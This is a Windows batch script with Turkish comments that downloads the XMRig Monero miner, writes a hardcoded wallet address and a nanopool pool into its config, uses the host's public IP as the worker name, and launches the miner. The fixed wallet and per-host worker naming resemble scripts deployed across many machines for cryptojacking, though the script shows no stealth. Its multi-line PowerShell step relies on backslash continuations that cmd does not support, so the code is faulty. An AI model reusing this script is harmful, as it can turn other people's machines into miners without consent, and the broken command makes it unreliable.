@echo off
setlocal enabledelayedexpansion

:: Değişkenler
set "XMRIG_URL=https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
set "ZIP_NAME=xmrig.zip"
set "EXTRACT_FOLDER=xmrig-6.21.0"
set "TARGET_FOLDER=fatsa"
set "WALLET=4A2ffGj3RJBXj7VCQzseUNNNfQKUuj92xek9zQ87XRvN4gJzouDRtWjZZvzpupyaxFfTtgxW6i1ThXzVYEKTDYsY5wEHf54"
set "POOL=xmr-eu1.nanopool.org:14444"

echo [*] XMRig indiriliyor...
curl -L -o %ZIP_NAME% %XMRIG_URL%

echo [*] Zipten cikariliyor...
powershell -Command "Expand-Archive -Path '%ZIP_NAME%' -DestinationPath '.' -Force"

echo [*] Klasor yapisi duzenleniyor...
if not exist %TARGET_FOLDER% mkdir %TARGET_FOLDER%
move %EXTRACT_FOLDER%\* %TARGET_FOLDER%\

echo [*] IP adresi aliniyor...
for /f "delims=" %%i in ('powershell -Command "(Invoke-WebRequest -Uri 'https://ident.me').Content"') do set "IP=%%i"

echo [*] config.json guncelleniyor...
set "FULL_USER=%WALLET%.%IP%"

:: PowerShell kullanarak JSON icindeki degerleri degistirme
powershell -Command "$json = Get-Content '%TARGET_FOLDER%\config.json' | ConvertFrom-Json; \
    $json.pools[0].user = '%FULL_USER%'; \
    $json.pools[0].url = '%POOL%'; \
    $json.pools[0].algo = 'rx/0'; \
    $json.('health-print-time') = 5; \
    $json | ConvertTo-Json -Depth 10 | Out-File '%TARGET_FOLDER%\config.json' -Encoding ascii"

echo [*] Islem tamamlandi. XMRig baslatiliyor...
cd %TARGET_FOLDER%
start xmrig.exe
